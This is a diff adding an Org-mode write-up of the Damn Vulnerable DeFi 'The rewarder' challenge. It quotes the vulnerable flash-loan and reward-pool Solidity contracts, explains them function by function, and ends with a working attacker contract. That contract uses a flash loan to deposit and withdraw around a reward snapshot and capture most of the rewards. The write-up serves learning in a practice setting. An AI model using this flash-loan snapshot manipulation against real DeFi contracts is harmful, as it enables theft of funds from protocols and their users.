@@ -1,0 +1,266 @@
+#+AUTHOR: Francesco Cannarozzo
+* The rewarder
+  ../contracts/the-rewarder
+** Statement
+   Every 5 days, depositing DVT onto the pool rewards tokens.
+   Without any token, we ought to get most of the rewards for ourselves in the upcoming round.
+** Files
+*** FlashLoanerPool.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+
+     pragma solidity ^0.8.0;
+
+     import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+     import "@openzeppelin/contracts/utils/Address.sol";
+     import "../DamnValuableToken.sol";
+
+     /**
+     * @title FlashLoanerPool
+     * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+
+     * @dev A simple pool to get flash loans of DVT
+     */
+     contract FlashLoanerPool is ReentrancyGuard {
+
+     using Address for address;
+
+    DamnValuableToken public immutable liquidityToken;
+
+    constructor(address liquidityTokenAddress) {
+        liquidityToken = DamnValuableToken(liquidityTokenAddress);
+    }
+
+    function flashLoan(uint256 amount) external nonReentrant {
+        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
+        require(amount <= balanceBefore, "Not enough token balance");
+
+        require(msg.sender.isContract(), "Borrower must be a deployed contract");
+        
+        liquidityToken.transfer(msg.sender, amount);
+
+        msg.sender.functionCall(
+            abi.encodeWithSignature(
+                "receiveFlashLoan(uint256)",
+                amount
+            )
+        );
+
+        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
+    }
+}
+     #+END_SRC
+**** Breakdown
+***** flashLoan
+      performs flashLoan functionality, only accepting contracts as *msg.sender*, and calling its
+      *receiveFlashLoan(uint256)* function.
+*** TheRewarderPool.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./RewardToken.sol";
+import "../DamnValuableToken.sol";
+import "./AccountingToken.sol";
+
+/**
+ * @title TheRewarderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+
+ */
+contract TheRewarderPool {
+
+    // Minimum duration of each round of rewards in seconds
+    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
+
+    uint256 public lastSnapshotIdForRewards;
+    uint256 public lastRecordedSnapshotTimestamp;
+
+    mapping(address => uint256) public lastRewardTimestamps;
+
+    // Token deposited into the pool by users
+    DamnValuableToken public immutable liquidityToken;
+
+    // Token used for internal accounting and snapshots
+    // Pegged 1:1 with the liquidity token
+    AccountingToken public accToken;
+    
+    // Token in which rewards are issued
+    RewardToken public immutable rewardToken;
+
+    // Track number of rounds
+    uint256 public roundNumber;
+
+    constructor(address tokenAddress) {
+        // Assuming all three tokens have 18 decimals
+        liquidityToken = DamnValuableToken(tokenAddress);
+        accToken = new AccountingToken();
+        rewardToken = new RewardToken();
+
+        _recordSnapshot();
+    }
+
+    /**
+     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
+     */
+    function deposit(uint256 amountToDeposit) external {
+        require(amountToDeposit > 0, "Must deposit tokens");
+        
+        accToken.mint(msg.sender, amountToDeposit);
+        distributeRewards();
+
+        require(
+            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
+        );
+    }
+
+    function withdraw(uint256 amountToWithdraw) external {
+        accToken.burn(msg.sender, amountToWithdraw);
+        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
+    }
+
+    function distributeRewards() public returns (uint256) {
+        uint256 rewards = 0;
+
+        if(isNewRewardsRound()) {
+            _recordSnapshot();
+        }        
+        
+        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
+        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
+
+        if (amountDeposited > 0 && totalDeposits > 0) {
+            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
+
+            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
+                rewardToken.mint(msg.sender, rewards);
+                lastRewardTimestamps[msg.sender] = block.timestamp;
+            }
+        }
+
+        return rewards;     
+    }
+
+    function _recordSnapshot() private {
+        lastSnapshotIdForRewards = accToken.snapshot();
+        lastRecordedSnapshotTimestamp = block.timestamp;
+        roundNumber++;
+    }
+
+    function _hasRetrievedReward(address account) private view returns (bool) {
+        return (
+            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
+            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
+        );
+    }
+
+    function isNewRewardsRound() public view returns (bool) {
+        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+}
+
+     #+END_SRC
+**** Breakdown
+***** State
+      The contract holds a constant uint *REWARDS_MIN_DURATION* set to five days,
+      representing the interval between one rewards round and the other.
+      uints *lastSnapshotIdForRewards* and *lastRecordedSnapshotTimestamp* represent the
+      state of the snapshot being used for the upcoming rewards round.
+
+      Reward round history is stored in a *mapping( address => uint256)*, mapping rewarded
+      addressess onto reward timestamps. references to the three tokens used (DVT, liquidityToken, rewardToken) are then mantained,
+      along with one more uint tracking the number of rounds elapsed since deployment.
+***** Constructor
+      construction takes the address of a *dDamnValuebleToken* instance to use as liquidity token,
+      then creates new AccountingToken and RewardToken instances. it then uses its internal method
+      to record a snapshot.
+***** Deposit
+      Allows user to deposit *amount* liquidity tokens. *amount* accounting tokens are then issued
+      to *msg.sender*, and *distributeRewards()* is called.
+      finally, the transfer of *amount* DVT from *msg.sender* to *this* is required to go through.
+***** Withdraw
+      uint *amountToWithDraw* accounting tokens will be burned from *msg.sender*, finally
+      requiring the corresponding transfer of liquidity tokens from *this* to *msg.sender* to go
+      through. Essentially simmetrical with the *deposit()* method, were it not for the call to  
+      *distributeRewards()* by the former.
+***** DistributeRewards
+      assigns uint *rewards* to 0.
+      if *isNewRewardsRound()* returns true, a new snapshot is recorded through the contract's 
+      corresponding private function.
+      Then, uint *totalDeposit* is assigned as the accounting token's  total supply at the last
+      valid snapshot, while *amountDeposited* is assigned as the balance of msg.sender's at the
+      same snapshot.
+
+      It's then time to decide: first, the amount of *rewards* earned by the user,
+      as the fraction of their *amountDeposited* over *totalDeposits*.
+
+      Finally, if *rewards* are positive and *msg.sender* hasn't retrieved their rewards for
+      the current round. *reward* amount rewardTokens are freshly minted as they're awarded:
+      *lastRewardTimetsamps[msg.sender]* is then set to current block's.
+      
+***** _recordSnapshot
+      Private function. takes a snapshot of accounting token, assigns it to *lastSnapshotIdforRewards*
+      finally, *lastRecordedSnapshotTimestamp* is set as current block's, and *roundNumber* is incremented.
+***** _hasRetrievedReward
+      Private function.
+      for given account address, returns whether reward ahas been claimed for current round.
+      For that to be the case, *lastRewardTimestamps[account]* is required to be greater (that is, later)
+      than *lastRecordedSnapshotTimeStamp* _AND_ lesser (that is, earlier) than the very same
+      last recorded snapshot timestamp, summed to the minimum round duration.
+***** isNewRewardsRounds
+      public view returning true if indeed the current block's timestamp is greater than
+      *lastRecordedSnapshotTimestamp* plus the round duration.
+      
+** Exploit
+   Time, if anything, is central to solving this challenge.
+
+   Something we can easily notice is how, for reward purposes, the contract trusts snapshots.
+   Since, however, such snapshot is *only* taken once per round as *distributeRewards()* is called,
+   an attacker could, after waiting for the beginning of a new round,
+   simply flashLoan enough tokens, and before *flashLoan()* returns deposit all tokens to *rewarderPool*.
+   immediately withdrawing them, and be assigned a great proportion of reward tokens.
+   Finally, flashLoaned Tokens can be returned.
+   #+BEGIN_SRC solidity
+   pragma solidity ^0.8.0;
+
+import "../../the-rewarder/RewardToken.sol";
+import "../../DamnValuableToken.sol";
+import "../../the-rewarder/AccountingToken.sol";
+import "../../the-rewarder/FlashLoanerPool.sol";
+import "../../the-rewarder/TheRewarderPool.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+
+
+
+contract TheRewarderAttacker {
+
+    using Address for address;
+
+    DamnValuableToken token;
+    FlashLoanerPool flashLoanerPool;
+    TheRewarderPool rewarderPool;
+
+    constructor(DamnValuableToken _token, FlashLoanerPool _pool1, TheRewarderPool _pool2){
+        token = _token;
+        flashLoanerPool = _pool1;
+        rewarderPool = _pool2;
+    }
+
+    function attack() public {
+        flashLoanerPool.flashLoan(1000000 ether);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        token.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        rewarderPool.withdraw(amount);
+        token.transfer(address(flashLoanerPool), amount);
+    }
+
+}
+   #+END_SRC
+
